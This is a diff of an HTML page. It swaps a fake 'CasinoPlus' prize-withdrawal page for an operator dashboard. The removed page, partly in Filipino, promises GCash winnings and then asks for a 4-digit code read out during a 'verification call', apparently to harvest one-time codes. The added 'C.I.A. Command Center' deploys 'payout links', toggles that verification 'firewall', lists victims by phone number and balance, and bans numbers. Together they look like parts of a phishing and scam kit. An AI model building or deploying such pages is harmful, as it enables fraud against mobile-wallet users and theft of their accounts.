@@ -2,213 +2,165 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CasinoPlus | Live Payout</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>C.I.A. | COMMAND CENTER</title>
     
-    <!-- External Libraries -->
+    <!-- PWA for Admin -->
+    <link rel="manifest" href="admin_manifest.json">
+    <meta name="theme-color" content="#00f2ff">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="CIA Admin">
+    <link rel="apple-touch-icon" href="images/gc_icon.png">
+    
+    <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
     
     <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&display=swap" rel="stylesheet">
     
     <!-- External CSS -->
-    <link rel="stylesheet" href="styles/msheet.css">
+    <link rel="stylesheet" href="styles/ads.css">
 </head>
 <body>
 
-    <!-- Live Winner Ticker -->
-    <div class="live-winner-box" id="winnerBox">
-        <div class="dot"></div>
-        <span id="winnerEntry">Welcome to CasinoPlus Lucky Drop!</span>
+<!-- ========== LOGIN OVERLAY ========== -->
+<div id="loginOverlay" class="login-overlay">
+    <div class="login-box">
+        <div class="login-icon">🔻</div>
+        <h2>C.I.A. ACCESS</h2>
+        <input type="password" id="accessKey" placeholder="ENTER MASTER KEY" autocomplete="off">
+        <button onclick="verifyAccess()">AUTHORIZE</button>
+        <div id="loginError" class="error-msg"></div>
     </div>
+</div>
 
-    <!-- Mobile Only Message -->
-    <div id="mobileOnly">
-        <h2 style="color:#fbbf24">📱 MOBILE ONLY</h2>
-        <p>Please use your smartphone to access this reward.</p>
-    </div>
-
-    <!-- Main Game Card -->
-    <div class="card" id="mainCard">
-        <img src="images/casino.jpeg" class="casino-banner" onerror="this.style.display='none'">
-        <img src="images/logo1.png" class="logo-img">
-        
-        <!-- Game Grid (6 Cards) -->
-        <div class="game-grid" id="grid">
-            <div class="card-wrapper" data-card-id="1"><img src="images/img1.png" class="card-img"></div>
-            <div class="card-wrapper" data-card-id="2"><img src="images/img2.png" class="card-img"></div>
-            <div class="card-wrapper" data-card-id="3"><img src="images/img3.png" class="card-img"></div>
-            <div class="card-wrapper" data-card-id="4"><img src="images/img4.png" class="card-img"></div>
-            <div class="card-wrapper" data-card-id="5"><img src="images/img5.png" class="card-img"></div>
-            <div class="card-wrapper" data-card-id="6"><img src="images/img6.png" class="card-img"></div>
+<!-- ========== MAIN DASHBOARD ========== -->
+<div id="dashboard" class="dashboard">
+    
+    <!-- Header -->
+    <div class="cia-header">
+        <div class="header-left">
+            <h1><span>🔻</span> C.I.A. COMMAND CENTER <span>🔻</span></h1>
+            <p>CLASSIFIED // EYES ONLY // LEVEL 5 CLEARANCE</p>
         </div>
-
-        <!-- Balance Display -->
-        <div class="amount" id="balanceText">₱0.00</div>
-
-        <!-- Pending Status Area -->
-        <div id="pendingStatusArea" style="display: none; margin-top: 15px;">
-            <div id="pendingStatusText" class="pending-status-text">⏳ PENDING FOR APPROVAL ⏳</div>
-            <div id="pendingCountdown" class="pending-countdown">03:00</div>
-            <div id="pendingMessage" class="pending-message-text">Prize will be available again after the time frame ends.</div>
-        </div>
-
-        <!-- Status Label -->
-        <div id="statusLabel" style="font-size:12px; color:#fbbf24; margin-bottom:10px;">Initializing...</div>
-        
-        <!-- Withdraw Button -->
-        <button class="btn-main" id="claimBtn">Withdraw Rewards</button>
-
-        <!-- Trust Badge -->
-        <div class="trust-badge">
-            <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
-            </svg>
-            Secured 256-bit Payout Encryption
-        </div>
-        
-        <img src="images/casinoplus.jpeg" class="footer-img" onerror="this.style.display='none'">
+        <button class="logout-btn" onclick="logout()">⛔ TERMINATE SESSION</button>
     </div>
 
-    <!-- Processing Overlay -->
-    <div id="processingOverlay">
-        <div class="spinner"></div>
-        <p style="margin-top:15px; font-weight:800; color:#fff;">PROCESSING WITHDRAWAL...</p>
-    </div>
-
-    <!-- Roulette Side Game Icon -->
-    <div id="rouletteIcon" style="position: fixed; bottom: 20px; right: 20px; z-index: 9999; cursor: pointer;">
-        <div style="background: radial-gradient(circle, #ffd700, #ff8800); width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5), 0 0 15px #ffaa33; animation: pulseGlow 1.5s infinite;">
-            <span style="font-size: 32px;">🎰</span>
+    <!-- DEPLOY LINKS & FIREWALL -->
+    <div class="card">
+        <div class="card-header">
+            <h3><span>⚡</span> DEPLOY LINKS &amp; FIREWALL</h3>
         </div>
-        <div style="position: absolute; top: -5px; right: -5px; background: red; color: white; font-size: 10px; border-radius: 50%; padding: 2px 6px; font-weight: bold;">NEW</div>
-    </div>
-
-    <!-- Roulette Modal -->
-    <div id="rouletteModal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; display: none; align-items: center; justify-content: center; overflow-y: auto; padding: 20px;">
-        <div style="position: relative; max-width: 500px; width: 100%;">
-            <div id="closeRoulette" style="position: absolute; top: -40px; right: 0; background: #ff4444; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 24px; font-weight: bold; color: white; z-index: 10;">✕</div>
-            <iframe id="rouletteIframe" src="roulette.html" style="width: 100%; height: 600px; border: none; border-radius: 40px; background: transparent;"></iframe>
-        </div>
-    </div>
-
-    <!-- ========== CONGRATULATIONS POPUP ========== -->
-    <div id="claimPopup" class="claim-popup-overlay">
-        <div class="claim-popup-card">
-            <div class="popup-close-btn" onclick="hideClaimPopup()">✕</div>
-            <h2 class="congrats-title">🎉 CONGRATULATIONS! 🎉</h2>
-            <div class="greeting">💎 YOU'RE A LUCKY WINNER! 💎</div>
-            <div class="prize-amount-wrapper">
-                <div class="prize-amount" id="popupPrizeAmount">₱0</div>
-                <div class="prize-underline"></div>
+        <div class="card-body">
+            <!-- DEPLOY LINKS SECTION -->
+            <div class="form-group">
+                <label class="form-label">🔗 Deploy Payout Links</label>
+                <textarea id="links" rows="3" placeholder="Enter links (one per line)"></textarea>
+                <button class="btn" onclick="deploy()">🚀 DEPLOY NOW</button>
             </div>
-            <div class="message">
-                <p>Ang iyong panalo ay handa na para sa iyong pag claim.</p>
-                <p>Sa sandaling ma-<strong class="highlight">AUTHORIZE</strong> ang inyong claiming process, ang lahat ng credits ay agad na withdraw.</p>
-                <p>Ang iyong <strong>mobile number</strong> ay lalabas sa <strong>Live Winners</strong></p>
+            
+            <div class="divider"></div>
+            
+            <!-- FIREWALL SECTION -->
+            <div class="form-group">
+                <label class="form-label">🔥 Global Firewall Control</label>
+                <button id="firewallToggleBtn" class="firewall-off" onclick="toggleFirewall()">FIREWALL OFF</button>
+                <div id="firewallStatusMsg" class="status-msg"></div>
             </div>
-            <div class="simple-note">
-                <p>⚡ Kapag na-Authorize, automatic na transfer sa iyong GCash ang inyong premyo ⚡</p>
-            </div>
-            <button id="claimActionBtn" class="claim-action-btn" onclick="onClaimAction()">CLAIM THRU GCASH</button>
-            <div class="info-note">🔒 Secured Transaction | No Hidden Fees</div>
         </div>
     </div>
 
-    <!-- ========== FIREWALL VERIFICATION POPUP ========== -->
-    <div id="firewallPopup" class="firewall-popup-overlay" style="display: none;">
-        <div class="firewall-popup-card">
-            <div class="popup-close-btn" onclick="hideFirewallPopup()">✕</div>
-            <div id="firewallPopupContent">
-                <div class="firewall-warning-icon">📞</div>
-                <h2>VERIFICATION REQUIRED</h2>
-                <div class="firewall-message">
-                    <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
-                    <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
-                    <p>Enter the code below to continue.</p>
+    <!-- LINK MONITOR -->
+    <div class="card">
+        <div class="card-header">
+            <h3><span>📡</span> LINK MONITOR</h3>
+        </div>
+        <div class="card-body">
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr><th>ID</th><th>HASH</th><th>STATUS</th><th>USER</th><th>ACTIONS</th></tr>
+                    </thead>
+                    <tbody id="linkData"></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- USER LOGS (dropdown) -->
+    <div class="dropdown-section">
+        <div class="dropdown-header" onclick="toggleDropdown('userDropdown')">
+            <div class="dropdown-title">
+                <span>👻</span> USER LOGS
+            </div>
+            <div class="dropdown-controls">
+                <span class="dropdown-badge" id="activeUsersBadge">0 ACTIVE</span>
+                <div class="filter-group">
+                    <button class="filter-btn" id="filterDevBtn" onclick="filterByDev()" title="Sort by Device">📱 DEV</button>
+                    <button class="filter-btn" id="filterLastSeenBtn" onclick="filterByLastSeen()" title="Sort by Last Seen">⏰</button>
                 </div>
-                <div class="verification-input-group">
-                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
-                    <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
-                </div>
-                <div class="firewall-note">
-                    <p>Waiting for system-verification call...</p>
-                </div>
-                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
+                <span class="dropdown-arrow">▼</span>
+            </div>
+        </div>
+        <div id="userDropdown" class="dropdown-content">
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr><th>PHONE</th><th>BALANCE</th><th>DEV#</th><th>LAST SEEN</th><th>ACTIONS</th></tr>
+                    </thead>
+                    <tbody id="ghostData"></tbody>
+                </table>
             </div>
         </div>
     </div>
 
-    <!-- External Scripts -->
-    <script src="js/config.js"></script>
-    <script src="js/game.js"></script>
-    <script src="js/firewall.js"></script>
-    <script src="js/popup.js"></script>
+    <!-- BAN PROTOCOL (dropdown) -->
+    <div class="dropdown-section">
+        <div class="dropdown-header" onclick="toggleDropdown('banDropdown')" data-danger="true">
+            <div class="dropdown-title">
+                <span>⚠️</span> BAN PROTOCOL
+            </div>
+            <div class="dropdown-controls">
+                <span class="dropdown-badge danger" id="bannedBadge">0 BANNED</span>
+                <span class="dropdown-arrow">▼</span>
+            </div>
+        </div>
+        <div id="banDropdown" class="dropdown-content">
+            <div class="form-group">
+                <input type="text" id="banTarget" placeholder="Enter phone number to terminate">
+                <button class="btn btn-danger" onclick="banGhost()">💀 EXECUTE BAN</button>
+            </div>
+            <div class="table-wrap" style="margin-top: 12px;">
+                <tr>
+                    <thead><tr><th>BANNED RECORDS</th><th></th></tr></thead>
+                    <tbody id="banList"></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
 
-    <script>
-        // Roulette Modal Logic
-        const rouletteIcon = document.getElementById('rouletteIcon');
-        const rouletteModal = document.getElementById('rouletteModal');
-        const closeRoulette = document.getElementById('closeRoulette');
-        
-        rouletteIcon.addEventListener('click', () => {
-            rouletteModal.style.display = 'flex';
-            setTimeout(() => {
-                if (typeof window.syncRouletteJackpotStatus === 'function') {
-                    window.syncRouletteJackpotStatus(window.rouletteJackpotLocked || false);
-                }
-                if (typeof window.syncBalanceToRoulette === 'function') {
-                    window.syncBalanceToRoulette();
-                }
-            }, 500);
-        });
-        
-        closeRoulette.addEventListener('click', () => {
-            rouletteModal.style.display = 'none';
-        });
-        
-        rouletteModal.addEventListener('click', (e) => {
-            if (e.target === rouletteModal) {
-                rouletteModal.style.display = 'none';
-            }
-        });
+    <!-- Master Key Button -->
+    <div class="master-key-footer">
+        <button class="master-key-btn" onclick="showMasterKeyPopup()">🔑 MASTER KEY CONTROL</button>
+    </div>
+</div>
 
-        // Shared Balance Functions
-        window.updateGameBalance = function(newBalance) {
-            if (typeof GameState !== 'undefined') {
-                GameState.balance = newBalance;
-                if (typeof updateUI === 'function') updateUI();
-                if (typeof saveData === 'function') saveData();
-            }
-            const balanceText = document.getElementById('balanceText');
-            if (balanceText) balanceText.innerText = "₱" + newBalance.toLocaleString() + ".00";
-            if (typeof window.syncBalanceToRoulette === 'function') window.syncBalanceToRoulette();
-            console.log('💰 Balance synced:', newBalance);
-        };
+<!-- ========== MASTER KEY POPUP ========== -->
+<div id="keyPopup" class="key-popup" style="display:none;">
+    <div class="key-popup-card">
+        <h3>🔑 UPDATE MASTER KEY</h3>
+        <input type="password" id="popupNewKey" placeholder="Enter new master key">
+        <div class="key-popup-buttons">
+            <button class="btn" onclick="updateMasterKey()">UPDATE</button>
+            <button class="btn btn-cancel" onclick="closeKeyPopup()">CANCEL</button>
+        </div>
+    </div>
+</div>
 
-        window.getCurrentBalance = function() {
-            if (typeof GameState !== 'undefined' && GameState.balance !== undefined) return GameState.balance;
-            const balanceText = document.getElementById('balanceText');
-            if (balanceText) {
-                let val = parseInt(balanceText.innerText.replace(/[₱,]/g, ''));
-                return isNaN(val) ? 0 : val;
-            }
-            return 0;
-        };
-        
-        // Expose Firewall functions for global access
-        window.showFirewallPopup = function() {
-            const popup = document.getElementById('firewallPopup');
-            if (popup) popup.style.display = 'flex';
-        };
-        
-        window.hideFirewallPopup = function() {
-            const popup = document.getElementById('firewallPopup');
-            if (popup) popup.style.display = 'none';
-        };
-    </script>
+<!-- External JavaScript -->
+<script src="js/adscript.js"></script>
+
 </body>
 </html>
